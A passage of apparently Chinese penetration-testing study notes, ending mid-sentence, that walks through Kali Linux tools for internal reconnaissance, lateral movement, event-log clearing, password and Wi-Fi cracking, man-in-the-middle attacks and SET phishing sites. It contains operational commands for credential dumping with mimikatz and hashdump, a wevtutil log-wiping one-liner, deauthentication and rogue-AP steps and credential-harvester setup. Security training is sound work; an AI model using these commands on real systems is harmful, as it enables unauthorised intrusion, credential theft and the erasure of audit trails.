title="（一）信息收集"></a>（一）信息收集</h2><ol><li><strong>内网信息收集分类</strong><ul><li><strong>本机信息收集</strong>：涵盖账户信息（判断权限提升需求）、网络和端口信息（确定网络连接情况）、进程列表（关注安全软件进程）、系统和补丁信息（辅助提权）、凭据收集（扩大战果）。</li><li><strong>域内信息收集</strong>：判断是否处于域环境，查找域管理员和域控主机，了解域内结构与权限分配。</li></ul></li><li><strong>不同系统信息收集方法</strong><ul><li><strong>Linux 主机</strong>：运用如 <code>ifconfig</code>、<code>netstat</code>、<code>ps -ef</code>、<code>cat /etc/issue</code>、<code>uname -a</code> 等命令收集信息。</li><li><strong>Windows 主机</strong>：借助 <code>ipconfig</code>、<code>netstat -ano</code>、<code>tasklist</code>、<code>systeminfo</code>、<code>net user</code> 等系统命令分析系统和内网状况。</li></ul></li><li><strong>敏感文件收集</strong><ul><li><strong>Windows 主机敏感文件</strong><ul><li><strong>系统配置文件</strong>：包含 <code>C:\boot.ini</code>、<code>C:\Windows\win.ini</code> 等，存储系统关键配置。</li><li><strong>用户信息文件</strong>：如 <code>C:\Windows\repair\sam</code> 保存初始密码，<code>C:\Users\用户名\NTUSER.DAT</code> 存储注册表信息。</li><li><strong>日志文件</strong>：像 <code>C:\Windows\Debug\NetSetup.log</code> 记录网络设置日志。</li><li><strong>文档文件</strong>：<code>*.docx</code> 等格式可能含敏感业务或个人数据。</li></ul></li><li><strong>Linux 主机敏感文件</strong><ul><li><strong>系统配置文件</strong>：<code>/etc/passwd</code> 记录用户信息，<code>/etc/shadow</code> 存储密码。</li><li><strong>用户信息文件</strong>：<code>/root/.ssh/authorized_keys</code> 记录 SSH 公钥等。</li><li><strong>日志文件</strong>：<code>/var/log/messages</code> 记录系统消息。</li><li><strong>文档文件</strong>：与 Windows 类似，可能存在敏感信息。</li></ul></li></ul></li><li><strong>利用框架收集内网信息</strong><ul><li><strong>Metasploit 框架</strong><ul><li><strong>网络状态</strong>：通过 <code>route list</code> 查看路由表，<code>arp</code> 命令获取 ARP 缓存，<code>run post/windows/gather/dnscache_dump</code> 收集 DNS 缓存，<code>netstat</code> 显示网络连接状态。</li><li><strong>用户信息</strong>：用 <code>run post/windows/gather/enum_logged_on_users</code> 枚举登录用户，<code>hashdump</code> 或 <code>run post/windows/gather/smart_hashdump</code> 获取密码哈希值，<code>load kiwi</code> 后 <code>creds_all</code> 收集凭据。</li><li><strong>枚举域控主机</strong>：<code>run post/windows/gather/enum_domain</code> 确定域名和域控 IP，<code>run post/windows/gather/enum_ad_computers</code> 枚举域控详细信息，<code>run post/windows/gather/enum_ad_groups</code> 枚举域内组信息。</li></ul></li><li><strong>Starkiller 框架</strong>：借助集成的 PowerView 工具，使用 <code>powershell/situational_awareness/network/powerview/get_user</code> 模块查询用户信息，<code>powershell/situational_awareness/network/powerview/get_computer</code> 获取域控主机详细信息，<code>powershell/situational_awareness/network/powerview/get_domain_controller</code> 仅显示域控主机信息。</li></ul></li></ol><h2 id="（二）横向移动"><a href="#（二）横向移动" class="headerlink" title="（二）横向移动"></a>（二）横向移动</h2><ol><li><strong>横向移动情况分类</strong><ul><li>目标主机拥有最高权限且能获取域控主机会话。</li><li>目标主机拥有最高权限但无法与域控主机连接获取会话。</li><li>目标主机无最高权限但可横向移动到其他服务器获取域控主机会话。</li><li>目标主机无最高权限且内网无可横向移动主机。</li></ul></li><li><strong>获取域控主机会话的方法</strong><ul><li><strong>代理路由</strong>：在 Metasploit 框架中，若已知域控主机网段，在 Meterpreter 会话输入 <code>run autoroute -s 目标主机内网网段</code> 添加路由，修改 <code>/etc/proxychains4.conf</code> 配置文件并运行代理服务，测试后可尝试获取域控主机会话。</li><li><strong>PsExec</strong>：先在 Meterpreter 会话中 <code>load kiwi</code> 加载扩展，用 <code>kiwi_cmd sekurlsa::logonPasswords</code> 获取账号密码，将会话置后台，使用 <code>exploit/windows/smb/psexec</code> 模块并配置相关参数获取域控主机会话。</li><li><strong>IPC$</strong>：先测试目标主机 <code>IPC$</code> 是否开启，生成木马文件，经 Meterpreter 会话上传到目标主机，再复制到域控主机，利用 <code>AT</code> 命令在指定时间运行木马获取会话。</li><li><strong>WMIC</strong>：生成木马文件并上传到域控主机，开启监听，在目标主机 <code>cmd</code> 终端输入特定命令执行木马获取会话，也可执行 PowerShell 脚本获取反向连接会话。</li></ul></li><li><strong>清除日志</strong>：Metasploit 框架中，在 Meterpreter 会话输入 <code>clearev</code> 清除目标系统事件日志，或加载 Mimikatz 扩展后用 <code>kiwi_cmd event::clear</code> 清除且不留痕迹；非 Metasploit 框架获取的会话，可用批处理命令 <code>for /F &quot;tokens=*&quot; %1 in (&#39;wevtutil.exe el&#39;) DO wevtutil.exe cl &quot;%1&quot;</code> 遍历清除。</li></ol><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="（一）哈希"><a href="#（一）哈希" class="headerlink" title="（一）哈希"></a>（一）哈希</h2><ol><li><strong>哈希概念与特点</strong>：哈希是将任意长度数据映射为固定长度数据的方法，具有正向快速、逆向困难、输入敏感、避免冲突的特点，广泛应用于密码学等领域，常见算法有消息摘要（MD）算法、安全散列算法（SHA）、哈希消息认证码（HMAC）等。</li><li><strong>不同系统哈希收集</strong><ul><li><strong>Linux 系统</strong>：用户密码哈希值存储在 <code>/etc/shadow</code> 文件，需 root 权限或利用漏洞工具读取，其密码哈希采用 SHA - 512 算法且加盐。</li><li><strong>Windows 系统</strong>：哈希值通常在 SAM 文件或 NTDS.DIT 文件中，获取系统权限后可用 Mimikatz 等工具提取，如 <code>mimikatz.exe sekurlsa::logonpasswords</code> 命令可获取用户密码哈希值，采用 NTLM 和 SHA1 等算法。</li></ul></li></ol><h2 id="（二）密码字典"><a href="#（二）密码字典" class="headerlink" title="（二）密码字典"></a>（二）密码字典</h2><ol><li><strong>分类</strong><ul><li><strong>弱密码字典</strong>：包含简单易猜密码，如 <code>123456</code> 等。</li><li><strong>强密码字典</strong>：有复杂随机密码。</li><li><strong>定制化字典</strong>：根据目标特征定制，如姓名、生日等。</li><li><strong>专用字典</strong>：针对特定场景，如 Wi - Fi 密码。</li></ul></li><li><strong>Kali Linux 自带字典文件及用途</strong>：<code>/usr/share/wordlists</code> 下的 <code>rockyou.txt</code> 是常用密码字典，需解压使用；<code>dirb</code> 和 <code>dirbuster</code> 目录用于网站扫描；<code>fern - wifi</code> 目录存储无线网络密码文件；<code>metasploit</code> 目录文件用于渗透测试；<code>wfuzz</code> 目录文件用于 Web 应用模糊测试。</li><li><strong>生成密码字典工具</strong><ul><li><strong>CeWL</strong>：根据指定 URL 和爬取深度生成密码字典，如 <code>cewl -w 保存的文件名　目标 URL 地址</code> 可爬取网站前两层页面生成字典，还可指定数字、字符、长度、爬取深度等参数。</li><li><strong>cupp</strong>：通过交互式问题收集目标个人信息生成字典，先安装 <code>apt install cupp</code>，用 <code>cupp -i</code> 进入交互模式，也可下载大型字典或扩展已有字典。</li><li><strong>Crunch</strong>：按指定规则和字符集生成密码字典，如 <code>crunch 最小长度　最大长度　字符集　选项</code>，可通过 <code>-t</code> 选项指定密码格式。</li></ul></li></ol><h2 id="（三）暴力破解工具"><a href="#（三）暴力破解工具" class="headerlink" title="（三）暴力破解工具"></a>（三）暴力破解工具</h2><ol><li><strong>hashcat</strong><ul><li><strong>基础用法</strong>：破解前需知加密算法 ID（通过 <code>hashcat --help</code> 查询）和选择攻击模式（如 0 为直接攻击模式，指定密码字典文件破解哈希），可叠加字典文件，利用规则文件变换字典，也可通过掩码机制自动生成字典破解哈希，掩码字符集有小写字母 <code>l</code>、大写字母 <code>u</code> 等多种。</li><li><strong>破解应用</strong>：破解 Linux 和 Windows 用户哈希，需确定对应算法 ID；破解压缩包密码，先提取哈希值（RAR 用 <code>rar2john</code> 工具，ZIP 用 <code>zip2john</code> 工具）再破解；支持分布式暴力破解，需指定大脑主机和客户端相关参数。</li></ul></li><li><strong>Hydra</strong>：指定协议名称破解网络服务密码，如 <code>hydra -L 用户字典文件 -P 密码字典文件 -t 10　-e ns ftp://IP 地址</code> 破解 FTP 服务，可根据情况指定用户名、批量破解网段或文件。</li><li><strong>John</strong>：支持多种加密算法，用脚本提取不同格式文件哈希值（如 <code>pdf2john.pl</code> 提取 PDF 文件哈希），删除文件名后用 <code>john --wordlist=字典文件 PDF 文件的哈希值</code> 破解，可指定加密算法加速破解，默认字典为 <code>/usr/share/john/password.lst</code>。</li><li><strong>Metasploit</strong>：在 Metasploit 终端用 <code>search auxiliary/scanner login</code> 列出暴力破解模块，以破解 Telnet 服务为例，选择 <code>auxiliary/scanner/telnet/telnet_login</code> 模块并配置相关参数后运行，破解成功可连接对应会话。</li></ol><h1 id="无线网络攻击"><a href="#无线网络攻击" class="headerlink" title="无线网络攻击"></a>无线网络攻击</h1><h2 id="（一）无线探测"><a href="#（一）无线探测" class="headerlink" title="（一）无线探测"></a>（一）无线探测</h2><ul><li><strong>无线适配器选择</strong>：为有效实施无线攻击，需选用支持监听模式和数据包注入的无线适配器。<ul><li>Atheros厂商<ul><li>ATH9K_HTC</li><li>ATH10K</li></ul></li><li>雷凌厂商<ul><li>RT73</li><li>RT2800USB</li><li>RT3070</li></ul></li><li>瑞昱厂商<ul><li>RTL8188EUS</li><li>RTL8188CU</li><li>RTL8188RU</li><li>RTL8192CU</li><li>RTL8192EU</li><li>RTL8723AU</li><li>RTL8811AU</li><li>RTL8812AU</li><li>RTL8814AU</li><li>RTL8821AU</li><li>RTW88-USB</li></ul></li><li>联发科厂商<ul><li>MT7610U</li><li>MT7612U</li></ul></li><li>高通厂商<ul><li>QCACLD-2.0</li><li>QCACLD-3.0<br>本篇选用雷凌 RT3070 无线适配器，使用前需在主机中插入并于 VM 虚拟机中连接，通过 <code>iwconfig</code> 命令查看创建的无线接口（如 wlan0），再用 <code>ifconfig wlan0 up</code> 激活接口。</li></ul></li></ul></li><li><strong>探测工具及方法</strong><ul><li><strong>iwlist 工具</strong>：是 wireless tools 套件一部分，用于扫描无线网络查看频率、信道、速率、加密方式等信息。在终端输入 <code>iwlist wlan0 scanning</code> 即可扫描周边无线网络，结果中 Address 为 MAC 地址，Channel 为信道，Frequency 为支持频率，Encryption key 显示加密密钥情况，ESSID 为网络名字。</li><li><strong>aircrack - ng 工具包</strong>：功能强大，可评估无线网络安全，具备嗅探、破解、注入等功能。使用时先通过 <code>airmon - ng start wlan0</code> 创建监听模式接口（新接口如 wlan0mon），若提示有影响进程可执行 <code>airmon - ng check kill</code> 关闭。之后输入 <code>airodump - ng wlan0mon</code> 扫描周边无线网络，扫描结果 BSSID 是 MAC 地址，PWR 为信号强度，Beacons 是数据包数量，CH 为信道，ENC 是加密算法体系，CIPHER 为检测到的加密算法，AUTH 是认证协议，ESSID 为网络名字，STATION 为客户端 MAC 地址。扫描结束后用 <code>airmon - ng stop wlan0mon</code> 关闭监听模式。</li><li><strong>Kismet 工具</strong>：是 802.11 无线网络探测器、嗅探器和入侵检测系统，可监测流量、探测隐藏网络和攻击行为，还能生成日志文件。在终端输入 <code>kismet - c wlan0</code> 启动服务，用浏览器访问输出链接并配置用户名和密码进入主界面查看扫描结果，可通过单击网络名称或相关菜单查看详细信息和筛选设备。</li></ul></li></ul><h2 id="（二）查找隐藏的-SSID"><a href="#（二）查找隐藏的-SSID" class="headerlink" title="（二）查找隐藏的 SSID"></a>（二）查找隐藏的 SSID</h2><ol><li><strong>隐藏 SSID 原理</strong>：默认 AP 广播信标帧显示 SSID，隐藏 SSID 可提高安全性，但攻击者仍可通过多种方式获取。</li><li><strong>查找方法</strong><ul><li><strong>捕获数据包</strong>：SSID 会在认证帧、关联帧、重关联帧等数据包中以明文形式出现。开启无线适配器监听模式后用 <code>airodump - ng wlan0mon</code> 查找周边网络，确定隐藏 SSID 的 BSSID。再用 Wireshark 查看 wlan0mon 通信，等待合法客户端连接 AP 时捕获信标帧获取 SSID。</li><li><strong>发送解除验证包</strong>：基于捕获数据包方式，先开启监听模式和 Wireshark 捕获通信。在终端输入 <code>aireplay - ng - 0 10 - a [AP 的 MAC 地址] wlan0mon</code> 向目标 AP 发送解除验证数据包，使客户端掉线重连，在 Wireshark 过滤器中输入 <code>wlan.bssid == [AP 的 MAC 地址] &amp;&amp;!(wlan.fc.type_subtype == 0x08)</code> 筛选探测请求帧和关联请求帧获取 SSID。</li><li><strong>暴力破解</strong>：无线客户端搜索网络时会向所有信道发探测请求帧且 SSID 为空，隐藏 SSID 的网络对正确 SSID 会回复探测响应帧。使用 mdk3 工具，先执行 <code>apt install mdk3</code> 安装，在终端输入 <code>mdk3 wlan0mon p - b a - t [目标无线网络 MAC 地址] - s [速度]</code> 生成随机 SSID 并发送探测请求帧，在 Wireshark 过滤器中输入 <code>wlan.bssid == [无线网络的 MAC 地址]</code> 查看使用的 SSID，最后筛选探测响应帧获取 SSID。</li></ul></li></ol><h2 id="（三）绕过-MAC-地址认证"><a href="#（三）绕过-MAC-地址认证" class="headerlink" title="（三）绕过 MAC 地址认证"></a>（三）绕过 MAC 地址认证</h2><p>无线网络 MAC 地址认证基于物理地址过滤客户端。先通过 <code>airodump - ng - c [无线网络信道] - a -- bssid [无线网络 MAC 地址] wlan0mon</code> 获取 AP 中 MAC 地址白名单上的客户端 MAC 地址。然后关闭网络适配器监听接口（<code>ifconfig wlan0 down</code>），用 <code>macchanger - m [冒充的 MAC 地址] wlan0</code> 修改 MAC 地址，最后开启接口（<code>ifconfig wlan0 up</code>）查看修改结果，成功后即可连接 AP。</p><h2 id="（四）无线网络数据加密协议"><a href="#（四）无线网络数据加密协议" class="headerlink" title="（四）无线网络数据加密协议"></a>（四）无线网络数据加密协议</h2><ol><li><strong>常见加密协议</strong><ul><li><strong>WEP（有线等效保密）</strong>：最早的无线网络加密协议，用 RC4 流密码加密，因安全漏洞已弃用，但仍有使用。其固定 IV 导致数据包重用 IV 概率高，可通过生成大量相同密钥加密数据包破解。</li><li><strong>WPA（Wi - Fi 保护接入）</strong>：WEP 改进版，引入消息完整性检查和 TKIP，提高数据完整性和机密性，有 WPA - PSK 和 WPA - EAP 两种模式。</li><li><strong>WPA2</strong>：WPA 升级版，强制用 AES 和 CCMP 替代 TKIP，加密强度增强，也有 WPA2 - PSK 和 WPA2 - EAP 模式。</li><li><strong>WPA3</strong>：WPA2 最新版，强制用 PMF 特性，在不同模式下采用新方式，安全性更高。</li></ul></li><li><strong>破解方法</strong><ul><li><strong>破解 WEP</strong>：先开启无线适配器监听模式确定使用 WEP 的无线网络（如 ESSID 为 ADMIN 的 AP），用 <code>airodump - nd</code> 关注目标网络数据包并保存（<code>-- bssid [无线网络的 MAC 地址] -- channel [信道] -- write [保存的文件名] wlan0mon</code>）。再用 <code>aireplay - ng</code> 的 ARP 重放功能生成大量数据包（<code>- 3 - b [无线网络的 MAC 地址] - h [伪造的 MAC 地址] wlan0mon</code>），最后用 <code>aircrack - ng - w [密码字典文件] [保存的文件名.cap]</code> 破解 WEP 密钥。</li><li><strong>破解 WPA/WPA2 - PSK</strong>：先确定使用 WPA/WPA2 协议的 AP（如 ESSID 为 ADMIN 的 AP），用 <code>airodump - ng -- bssid [无线网络的 MAC 地址] -- channel [信道] -- write [保存的文件名称] wlan0mon</code> 抓取数据包捕获 4 次握手包，可等待新客户端连接或发送解除验证数据包（<code>aireplay - ng - 0 5 - a [无线网络的 MAC 地址] wlan0mon</code>）促使重连捕获。捕获后可用多种工具破解：<ul><li><strong>aircrack - ng</strong>：输入 <code>aircrack - ng - w [密码字典文件] [保存的文件名.cap]</code> 破解。</li><li><strong>CoWPAtty</strong>：先执行 <code>apt install cowpatty</code> 安装，再输入 <code>cowpatty - f [密码字典文件] - r [保存的文件名.cap] - s [无线网络的 ESSID]</code> 破解。</li><li><strong>hashcat</strong>：先将.cap 文件转换为 hashcat 能识别格式（<code>aircrack - ng [保存的文件名.cap] - J [保存的 hccap 文件名]</code>），再输入 <code>hashcat -- force - m 2500 [保存的文件名.hccap] [密码字典文件]</code> 破解。</li><li><strong>预先计算 PMK</strong>：用 <code>genpmk - f [指定密码字典文件] - d pmk - s &quot;无线网络的 ESSID&quot;</code> 生成包含预先生成 PMK 的文件，再用 CoWPAtty 工具（<code>cowpatty - d PMK 文件 - r [保存的文件名.cap] - s &quot;无线网络的 ESSID&quot;</code>）可加快破解速度。</li></ul></li></ul></li></ol><h2 id="（五）拒绝服务攻击"><a href="#（五）拒绝服务攻击" class="headerlink" title="（五）拒绝服务攻击"></a>（五）拒绝服务攻击</h2><p>常见手段有解除验证攻击、取消关联攻击、RTS/CTS 攻击、通信干扰攻击等。以解除验证攻击为例，先执行 <code>airodump - ng -- bssid [无线网络 MAC 地址] -- channel [信道] wlan0mon</code> 查看无线网络客户端，再在终端输入 <code>aireplay - ng - 0 [解除验证数据包次数] - a [无线网络 MAC 地址] - c [客户端 MAC 地址] wlan0mon</code> 发动攻击，不指定客户端 MAC 地址则攻击所有客户端，可使客户端掉线，通过 <code>airodump - ng</code> 工具输出查看结果。</p><h2 id="（六）克隆-AP-攻击"><a href="#（六）克隆-AP-攻击" class="headerlink" title="（六）克隆 AP 攻击"></a>（六）克隆 AP 攻击</h2><p>先使用 <code>airodump - ng</code> 确定要克隆 AP 对象（如 ESSID 为 Admin 的 AP），再用 <code>airbase - ng</code> 工具伪造 AP（<code>airbase - ng - a [无线网络 MAC 地址] – essid &quot;无线网络 ESSID&quot; - c [信道] wlan0mon</code>）。向被克隆 AP 客户端发送解除验证帧（<code>aireplay - ng - 0 5 - a [无线网络 MAC 地址] - c [客户端 MAC 地址] wlan0mon</code>）使其掉线，客户端重新搜索时会连接克隆 AP，可查看 <code>airbase - ng</code> 工具输出确认。</p><h2 id="（七）架设钓鱼-AP"><a href="#（七）架设钓鱼-AP" class="headerlink" title="（七）架设钓鱼 AP"></a>（七）架设钓鱼 AP</h2><p>与克隆 AP 攻击不同，钓鱼 AP 是创建类似但不完全相同的 AP 吸引客户端连接以传播恶意内容。使用 <code>berate - ap</code> 脚本架设，先执行 <code>apt install berate - ap</code> 安装，再输入 <code>berate_ap - w 2 wlan0mon [网络接口] [AP 名] [密码]</code> 可架设 WPA2 加密 AP，不设密码则为开放验证，吸引客户端连接后可进行恶意行为。</p><h2 id="（八）自动化工具破解"><a href="#（八）自动化工具破解" class="headerlink" title="（八）自动化工具破解"></a>（八）自动化工具破解</h2><ol><li><strong>Fern Wifi Cracker</strong>：用 Python 编写，支持多种加密方式破解及多种网络攻击和渗透测试技术。在 Kali Linux 中启动后选择无线接口扫描无线网络，选择目标网络（如 Admin），添加字典文件，选择无线客户端后开启自动化模式并点击 Attack 按钮进行暴力破解，可通过状态栏查看破解状态，破解成功后可存储结果并查看。</li><li><strong>Wifite</strong>：预装在 Kali Linux，启动前需安装依赖文件（<code>apt install hcxdumptool &amp;&amp; apt install hcxtools</code>）。启动后自动扫描无线网络，按 <code>Ctrl + C</code> 终止扫描并指定目标网络序号，工具自动查找 PMK、发送解除验证帧抓握手包并使用 <code>aircrack - ng</code> 暴力破解，可查看破解结果和储存的网络信息。</li></ol><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><h2 id="（一）攻击原理"><a href="#（一）攻击原理" class="headerlink" title="（一）攻击原理"></a>（一）攻击原理</h2><p>攻击者插入通信双方之间拦截、修改或伪造通信内容，常见形式为 ARP 欺骗和 DNS 欺骗。ARP 欺骗利用 ARP 协议缺陷伪造 MAC 地址，DNS 欺骗利用 DNS 协议缺陷伪造 IP 地址，攻击者借此成为中间人窃取或篡改数据，通常需借助 Ettercap、Bettercap、arpspoof 等工具。</p><h2 id="（二）Ettercap-框架"><a href="#（二）Ettercap-框架" class="headerlink" title="（二）Ettercap 框架"></a>（二）Ettercap 框架</h2><ol><li><strong>基本使用</strong>：在 Kali Linux 终端输入 <code>ettercap - G</code> 开启图形化界面，设置 Sniffing at startup、Primary Interface 等选项后保存，对指定网络接口主机进行嗅探。点击地球图标可选择 MITM 攻击类型，如 ARP 中毒、DNS 欺骗等，菜单栏可设置目标、主机等选项。</li><li><strong>ARP 欺骗及数据捕获</strong><ul><li>先开启内核转发功能（<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>），用 Ettercap 嗅探获取目标网络主机列表和网关信息，选择网关和目标主机 IP 地址添加到 Target 1 和 Target 2，选择 ARP Poisoning 并勾选 Sniff remote connections 开启捕获远程连接功能后点击 OK 开始欺骗。可使用 tcpdump 查看被欺骗主机和网关数据流（<code>tcpdump - i [网络接口] host [ARP 欺骗目标 IP 地址]</code>），用 driftnet 捕获图片（先安装 <code>apt - get install driftnet</code>，再输入 <code>driftnet - i [网络接口]</code>），用 urlsnarf 捕获 URL 地址（<code>urlsnarf - i [网络接口]</code>）。</li></ul></li><li><strong>DNS 欺骗</strong>：先对目标主机和网关进行 ARP 欺骗，编辑 <code>/etc/ettercap/etter.dns</code> 文件添加欺骗 DNS 记录，开启 Apache 服务，在 Plugins 选项中激活 dns_spoof 插件开始欺骗，右键可停止。</li><li><strong>内容过滤</strong>：通过编写过滤脚本来实现，语法类似 C 语言。如编写过滤 80 号端口请求脚本，用 <code>etterfilter</code> 工具编译后在 Ettercap 图形模式中加载执行，可对数据包进行修改或丢弃，达到欺骗、篡改等目的，但存在局限性。</li></ol><h2 id="（三）Bettercap-框架"><a href="#（三）Bettercap-框架" class="headerlink" title="（三）Bettercap 框架"></a>（三）Bettercap 框架</h2><ol><li><strong>基本使用</strong>：先执行 <code>apt - get install bettercap</code> 安装，输入 <code>bettercap</code> 启动交互模式，用 <code>help</code> 命令查看模块和命令。主要模块有 arp.spoof、dns.spoof 等，可用于不同攻击和侦查。如用 <code>net.recon</code> 模块扫描网络主机和服务（<code>net.recon on</code> 启用，<code>net.show</code> 查看结果）。</li><li><strong>ARP 欺骗和 DNS 欺骗</strong><ul><li><strong>ARP 欺骗</strong>：设置 <code>arp.spoof.targets</code> 为目标 IP 地址，<code>arp.spoof.fullduplex</code> 为 true 开启双向欺骗，分别执行 <code>arp.spoof on</code> 和 <code>net.sniff on</code> 启动模块进行欺骗和嗅探，用 <code>off</code> 命令停止。</li><li><strong>DNS 欺骗</strong>：先设置 <code>arp.spoof.targets</code> 启动 ARP 欺骗，再设置 <code>dns.spoof.domains</code> 和 <code>dns.spoof.address</code>，分别执行 <code>dns.spoof on</code> 和 <code>net.sniff on</code> 启动模块，停止用 <code>dns.spoof off</code>。</li></ul></li><li><strong>注入脚本</strong>：利用 <code>http.proxy</code> 模块，在指定目录新建 JavaScript 脚本文件，如 <code>xss.js</code>，在 Bettercap 交互模式中设置目标 IP 地址和注入脚本文件路径，启动 <code>arp.spoof</code> 和 <code>http.proxy</code> 模块可向目标主机网页注入脚本，也可与 BeEF 工具配合。</li><li><strong>CAP 文件</strong>：是 Bettercap 脚本文件，后缀为.cap，可在启动时指定或用 <code>include</code> 命令加载，实现常见攻击场景，可通过 <code>caplets.update</code> 安装更新，<code>caplets.show</code> 查看已安装文件，在交互会话中输入文件名可实现自动化流程。</li></ol><h2 id="（四）arpspoof-工具"><a href="#（四）arpspoof-工具" class="headerlink" title="（四）arpspoof 工具"></a>（四）arpspoof 工具</h2><p>用于 ARP 欺骗，优点是轻量级、易用、配置简单，缺点是功能单一。先开启内核转发功能，在终端输入 <code>arpspoof - i [网络接口] - t [目标主机 IP 地址] [网关 IP 地址]</code> 对目标主机执行欺骗，可用 tcpdump 等工具查看数据流。</p><h2 id="（五）SSL-攻击"><a href="#（五）SSL-攻击" class="headerlink" title="（五）SSL 攻击"></a>（五）SSL 攻击</h2><ol><li><strong>漏洞检测</strong><ul><li><strong>testssl 工具</strong>：需自行下载（<code>wget https://testssl.sh/testssl.sh</code> 并 <code>chmod + x testssl.sh</code>），输入 <code>./testssl.sh [域名或 IP 地址]</code> 可检测 TLS/SSL 配置和漏洞，也可检测特定漏洞（如 <code>./testssl.sh -- heartbleed [域名或 IP 地址]</code>）。</li><li><strong>SSLScan 工具</strong>：预装在 Kali Linux，输入 <code>sslscan [域名或 IP 地址]</code> 可检测 SSL 服务相关信息，但功能有局限。</li></ul></li><li><strong>中间人攻击</strong>：利用中间人攻击技术劫持 SSL 通信，先开启内核转发功能，设置防火墙规则（<code>iptables - t nat - A PREROUTING - p tcp -- destination - port 80 - j REDIRECT -- to - port 5353</code>），用 <code>sslstrip - l 5353</code> 监听降级 SSL 通信，再用 Ettercap 等工具对目标主机执行 ARP 欺骗，使目标主机访问 HTTPS 网页重定向为 HTTP，从而提取未加密流量。</li></ol><h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><h2 id="一、社会工程学概述"><a href="#一、社会工程学概述" class="headerlink" title="一、社会工程学概述"></a>一、社会工程学概述</h2><p>社会工程学是利用人的心理弱点和社会规则漏洞，通过欺骗等手段获取有价值信息或非法利益的学科，在渗透测试中常用，可绕过技术防御直接攻击目标人员。实施社会工程学攻击需提前做好以下三点：</p><ol><li><strong>信息收集</strong>：通过搜索引擎、社交媒体、公开数据库等收集目标基本信息（姓名、职位等），用于定位目标、选择攻击向量和定制攻击内容。</li><li><strong>目标分析</strong>：分析收集的信息，了解目标心理特征、行为模式和风险意识等，识别心理弱点、信任点和诱惑点。</li><li><strong>攻击计划</strong>：根据前两者结果制定详细计划，包括攻击目的、方式、时间和步骤等，组织攻击流程、预测风险并提供应对措施。</li></ol><p>Kali Linux提供了相关工具和框架，可生成木马文件或网页链接诱使目标操作。本章主要知识点包括社会工程学攻击方法、Social - Engineer Toolkit（SET）用法、伪装攻击者 URL 地址和钓鱼邮件攻击等。</p><h2 id="二、社会工程学攻击方法"><a href="#二、社会工程学攻击方法" class="headerlink" title="二、社会工程学攻击方法"></a>二、社会工程学攻击方法</h2><p>凯文·米特尼克指出人为因素是安全软肋，实际案例中企业虽投入大量资金仍可能被渗透，原因是目标人员易受信任关系影响而被欺骗获取关键信息或被控制执行恶意操作。常见攻击方法如下：</p><ol><li><strong>钓鱼邮件</strong>：冒充可信任发件人，用紧迫或诱人话语诱使目标单击链接或附件，窃取个人信息或感染计算机。</li><li><strong>钓鱼短信</strong>：发送伪装可信短信，诱导目标提供个人信息或访问恶意链接。</li><li><strong>无线网络钓鱼</strong>：创建虚假无线热点或网站，诱导用户连接或访问，窃取敏感信息或植入恶意软件。</li><li><strong>物理接入</strong>：利用物理手段或设备进入目标场所或网络，获取敏感信息或执行恶意操作。</li></ol><h2 id="三、Social-Engineer-Toolkit（SET）"><a href="#三、Social-Engineer-Toolkit（SET）" class="headerlink" title="三、Social - Engineer Toolkit（SET）"></a>三、Social - Engineer Toolkit（SET）</h2><p>SET 是 Kali Linux 中专门为社会工程学设计的开源渗透测试框架，可实施多种攻击并与其他工具联动提高效率。</p><h3 id="（一）窃取凭据"><a href="#（一）窃取凭据" class="headerlink" title="（一）窃取凭据"></a>（一）窃取凭据</h3><p>通过创建钓鱼网站克隆真实页面，欺骗用户输入账号密码，在后台捕获显示。操作步骤如下：</p><ol><li>在终端执行 <code>setoolkit</code> 命令启动 SET，首次启动需同意使用条款输入 <code>y</code> 进入交互式命令行界面。</li><li>选择 <code>Social - Engineering Attacks</code>，再选择 <code>Website Attack Vectors</code>，接着选择 <code>Credential Harvester Attack Method</code>。</li><li>可通过以下方式创建钓鱼页面：<ul><li><strong>预定义模板</strong>：选择后输入收集数据的服务器地址（如 192.168.8.138），有 Java Required、Google 和 Twitter 等模板，以 Google 为例启动后目标访问服务器地址可看到类似 Google 登录界面，提交表单后在 SET 界面查看凭据信息，提交后自动重定向到真实页面。</li><li><strong>克隆网站</strong>：选择克隆网站功能，输入服务器地址，在浏览器访问该地址可看到克隆的现有网站，诱导目标访问并输入信息，提交后在 SET 界面查看凭据。</li><li><strong>自定义网站</strong>：选择导入自定义文件功能，输入服务器地址和自定义网站文件路径（如通过 <code>wget -k -p http://testphp.vulnweb.com/login.php</code> 下载并更改文件名），选择导入所有文件，输入重定向 URL 地址，成功诱使目标提交信息后在 SET 界面查看凭据。</li></ul></li></ol><h3 id="（二）使用标签钓鱼窃取凭据"><a href="#（二）使用标签钓鱼窃取凭据" class="headerlink" title="（二）使用标签钓鱼窃取凭据"></a>（二）使用标签钓鱼窃取凭据</h3><p>由 Aza Raskin 发明，利用浏览器标签页欺骗用户。操作步骤：</p><ol><li>在 SET 主界面依次选择社会工程学攻击、网站攻击方法、Tabnabbing Attack Method，启动前需编辑 <code>/usr/share/set/src/webattack/tabnabbing/tabnabbing.py</code> 代码修正 <code>module &#39;urllib&#39; has no attribute &#39;urlopen&#39;</code> 问题。</li><li>选择克隆网站模块，输入收集凭据的服务器地址和克隆网站的 URL 地址创建标签钓鱼网站。用户访问时会提示等待加载，若切换标签页或离开计算机，页面会变成钓鱼网站，用户返回输入信息后可在 SET 界面查看凭据，同时自动跳转到真实页面。</li></ol><h3 id="（三）Web-劫持攻击"><a href="#（三）Web-劫持攻击" class="headerlink" title="（三）Web 劫持攻击"></a>（三）Web 劫持攻击</h3><p>利用 iframe 替换技术，伪造 URL 诱导目标单击访问，窃取数据或执行恶意操作。操作步骤：</p><ol><li>在 SET 主界面依次选择社会工程学攻击、网站攻击方法、Web Jacking Attack Method。</li><li>选择克隆网站模块，输入收集凭据的服务器地址和克隆网站地址创建钓鱼网站。目标访问时会看到弹出窗口显示克隆网站内容并提示单击链接，单击后被恶意链接覆盖，加载克隆钓鱼网站，用户提交登录表单后在 SET 界面查看凭据。</li></ol><h3 id="（四）多重攻击网络方法"><a href="#（四）多重攻击网络方法" class="headerlink" title="（四）多重攻击网络方法"></a>（四）多重攻击网络方法</h3><p>将多种攻击方式结合在钓鱼网站攻击中，在 SET 